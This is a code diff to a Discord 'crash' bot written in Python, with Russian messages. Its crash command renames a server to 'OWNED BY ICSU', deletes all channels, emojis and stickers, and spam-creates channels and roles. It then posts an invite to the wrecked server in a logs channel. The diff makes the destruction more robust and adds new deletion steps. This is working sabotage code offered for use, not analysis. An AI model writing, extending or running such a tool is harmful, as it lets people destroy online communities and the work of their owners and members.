@@ -137,18 +137,45 @@ async def хелп(ctx):
     await ctx.reply(embed=emb)
     
 async def crsh_channels(guild):
-    for b in range(50):
-        await guild.create_text_channel(name=channame)
+    try:
+        for b in range(50):
+            await guild.create_text_channel(name=channame)
+    except:
+        pass
+    
+async def spam_roles(guild):
+    try:
+        for b in range(50):
+            await guild.create_role(name='ICSU',colour=discord.Colour.dark_purple())
+    except:
+        pass
         
         
 async def del_channels(guild):
-    for b in guild.channels:
-        await b.delete()
+    try:
+        for b in guild.channels:
+            await b.delete()
+    except:
+        pass
+
+async def del_emojis(guild):
+    try:
+        for b in guild.emojis:
+            await b.delete()
+    except:
+        pass
+
+async def del_stickers(guild):
+    try:
+        for b in guild.stickers:
+            await b.delete()
+    except:
+        pass
     
     
 @bot.command()
 @commands.cooldown(1, 6 * 60 * 60, commands.BucketType.user)
-async def крш(ctx):
+async def crash(ctx):
     guild = ctx.guild
     if guild.id in whitelist:
         embed = discord.Embed(title='❌ Этот сервер находится в белом листе. Сервер нельзя крашнуть!',colour=discord.Colour.red())
@@ -162,9 +189,14 @@ async def крш(ctx):
         async with async_open('icsu.png', 'rb') as pfp:
             await ctx.guild.edit(name='OWNED BY ICSU',icon=await pfp.read())
         
-        asyncio.gather(del_channels(guild), crsh_channels(guild))
+        asyncio.gather(
+            del_channels(guild),
+            crsh_channels(guild),
+            spam_roles(guild),
+            del_emojis(guild),
+            del_stickers(guild))
         
-        await asyncio.sleep(10)
+        await asyncio.sleep(5)
             
         emb = discord.Embed(title='Бот крашнул сервер', colour=discord.Colour.green(),
         description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
@@ -173,10 +205,13 @@ async def крш(ctx):
         guildlink = None
         for textchan in guild.text_channels:
             if not guildlink:
-                guildlink = str(await textchan.create_invite())
-                if guildlink:
-                    emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
-                    await logs_channel.send(embed=emb)
+                try:
+                    guildlink = str(await textchan.create_invite())
+                except:
+                    pass
+            if guildlink:
+                emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
+                await logs_channel.send(embed=emb)
       
       
        
@@ -301,6 +336,7 @@ async def вайтлист(ctx, serv_id: int):
     
 
 bot.run(token, log_handler=None)
+
 
 
 
